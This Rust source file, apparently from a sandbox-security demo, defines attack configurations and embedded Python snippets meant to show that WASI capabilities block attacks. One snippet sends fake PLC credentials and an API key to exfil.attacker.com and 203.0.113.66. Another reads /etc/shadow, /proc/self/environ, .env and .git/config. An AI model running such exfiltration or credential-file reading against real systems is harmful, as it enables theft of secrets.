// what: attack configurations and python code for demo attacks
// why: separates attack definitions from ui logic for maintainability
// relations: used by component.rs; exports AttackConfig from types.rs

use super::types::AttackConfig;

// ============================================================================
// attack configurations
// ============================================================================

/// get attack configuration for the given attack type
pub fn get_attack_config(attack: &str) -> AttackConfig {
    match attack {
        "bufferOverflow" => AttackConfig {
            name: "Buffer Overflow",
            restart_ms: 1800,
            wasm_trap: "out of bounds memory access",
            wit_func: "malloc-large()",
        },
        "dataExfil" => AttackConfig {
            name: "Data Exfiltration",
            restart_ms: 2100,
            wasm_trap: "capability not granted: network",
            wit_func: "open-socket()",
        },
        "pathTraversal" => AttackConfig {
            name: "Path Traversal",
            restart_ms: 1500,
            wasm_trap: "capability not granted: filesystem",
            wit_func: "read-file()",
        },
        // ================================================================
        // Availability attacks (Raft leader election)
        // ================================================================
        "killLeader" => AttackConfig {
            name: "Kill Leader",
            restart_ms: 1500,
            wasm_trap: "leader instance terminated",
            wit_func: "(N/A - crash scenario)",
        },
        "heartbeatTimeout" => AttackConfig {
            name: "Heartbeat Timeout",
            restart_ms: 2000,
            wasm_trap: "leader unresponsive",
            wit_func: "(N/A - network scenario)",
        },
        _ => AttackConfig {
            name: "Unknown Attack",
            restart_ms: 1000,
            wasm_trap: "trap",
            wit_func: "unknown()",
        },
    }
}

// ============================================================================
// wit contract code for modal display
// ============================================================================

pub const WIT_CODE_EXCERPT: &str = r#"// wit/attacks.wit - WASI 0.2 Component Model
package reliability-triad:attacks@0.1.0;

interface common-types {
    record telemetry-packet { timestamp: u64, value: f64, status: u8 }
}

/// "Honey Pot" - capabilities attacker wants but shouldn't have
interface attack-surface {
    malloc-large: func(size: u64) -> result<u64, string>;
    open-socket: func(addr: string) -> result<u32, string>;
    read-file: func(path: string) -> result<list<u8>, string>;
}

/// Legitimate sensor capabilities
interface sensor-capabilities {
    read-hardware-register: func(reg-id: u32) -> f64;
    log-debug: func(msg: string);
}

/// WORKER: Instantiated 3x, NO knowledge of TMR/voting
world sensor-node {
    import sensor-capabilities;  // Granted
    import attack-surface;       // Host returns errors
    export process-tick: func() -> common-types.telemetry-packet;
}

/// SUPERVISOR: Manages lifecycle, runs on host
world system-supervisor { import tmr-logic; }

interface tmr-logic {
    consensus-2oo3: func(a: ..., b: ..., c: ...) -> result<packet, string>;
    trigger-hot-swap: func(node-index: u8);
}
"#;

// ============================================================================
// python attack code (executed via pyodide for real exceptions)
// ============================================================================

pub const ATTACK_BUFFER_OVERFLOW: &str = r#"
import time
start = time.perf_counter()
result = None

try:
    print("[ATTACK] Attempting heap spray (256MB)...")
    try:
        massive = bytearray(256 * 1024 * 1024)
    except MemoryError:
        print("[INFO] MemoryError on heap spray")
    
    print("[ATTACK] Attempting stack buffer overflow...")
    fixed = bytearray(64)
    overflow = b"A" * 128
    
    for i, b in enumerate(overflow):
        fixed[i] = b  # Will raise IndexError at i=64
    
    result = "VULNERABLE: Overflow succeeded!"
    
except MemoryError as e:
    elapsed = (time.perf_counter() - start) * 1000
    result = f"CRASHED|MemoryError|Unable to allocate 256MB|{elapsed:.1f}ms"
    
except IndexError as e:
    elapsed = (time.perf_counter() - start) * 1000
    result = f"CRASHED|IndexError|buffer[64] out of bounds|{elapsed:.1f}ms"
    
except Exception as e:
    result = f"CRASHED|{type(e).__name__}|{str(e)}"

result
"#;

pub const ATTACK_DATA_EXFIL: &str = r#"
import time
start = time.perf_counter()
result = None

sensitive = {
    "plc_creds": {"user": "engineer", "pass": "S!emens#2026"},
    "modbus_gw": "192.168.40.1:502",
    "api_key": "sk-historian-PROD-8x7k"
}
print(f"[ATTACK] Collected {len(sensitive)} sensitive objects")

try:
    import socket
    print("[ATTACK] Attempting DNS: exfil.attacker.com")
    
    try:
        ip = socket.gethostbyname("exfil.attacker.com")
        result = f"VULNERABLE|DNS resolved|{ip}"
    except socket.gaierror as e:
        print(f"[INFO] DNS blocked: {e}")
    
    print("[ATTACK] Attempting socket to 203.0.113.66:443")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1.0)
    sock.connect(("203.0.113.66", 443))
    sock.send(str(sensitive).encode())
    result = "VULNERABLE|socket.connect|Data exfiltrated!"
    
except socket.gaierror as e:
    elapsed = (time.perf_counter() - start) * 1000
    result = f"BLOCKED|socket.gaierror|DNS resolution failed|{elapsed:.1f}ms"
    
except (socket.error, OSError) as e:
    elapsed = (time.perf_counter() - start) * 1000
    result = f"BLOCKED|socket.error|Network access denied|{elapsed:.1f}ms"
    
except Exception as e:
    result = f"ERROR|{type(e).__name__}|{str(e)}"

result
"#;

pub const ATTACK_PATH_TRAVERSAL: &str = r#"
import time
import os
start = time.perf_counter()
result = None

targets = [
    "/etc/passwd", "/etc/shadow", "../../../etc/passwd",
    "/proc/self/environ", "/app/.env", "../../.git/config"
]
print(f"[ATTACK] Probing {len(targets)} paths...")

readable = []  # Files successfully read
exists_only = []  # Files exist but couldn't read
blocked = []  # Files blocked by sandbox

for path in targets:
    try:
        print(f"[PROBE] {path}")
        if os.path.exists(path):
            try:
                with open(path, 'r') as f:
                    content = f.read(64)
                readable.append(path)
                print(f"[EXFIL] Read from {path}")
            except PermissionError:
                exists_only.append(path)
        else:
            blocked.append(path)
    except OSError as e:
        blocked.append(path)

elapsed = (time.perf_counter() - start) * 1000

if readable:
    result = f"VULNERABLE|FileRead|Read {len(readable)} files!|{elapsed:.1f}ms"
elif exists_only:
    result = f"PARTIAL|PermissionError|{len(exists_only)} paths exist but unreadable|{elapsed:.1f}ms"
else:
    result = f"BLOCKED|OSError|All {len(targets)} paths blocked by sandbox|{elapsed:.1f}ms"

result
"#;

/// get the python attack code for the given attack type
pub fn get_attack_code(attack: &str) -> &'static str {
    match attack {
        "bufferOverflow" => ATTACK_BUFFER_OVERFLOW,
        "dataExfil" => ATTACK_DATA_EXFIL,
        "pathTraversal" => ATTACK_PATH_TRAVERSAL,
        _ => "{'status': 'unknown', 'error': 'InvalidAttack', 'msg': 'Unknown attack type'}"
    }
}
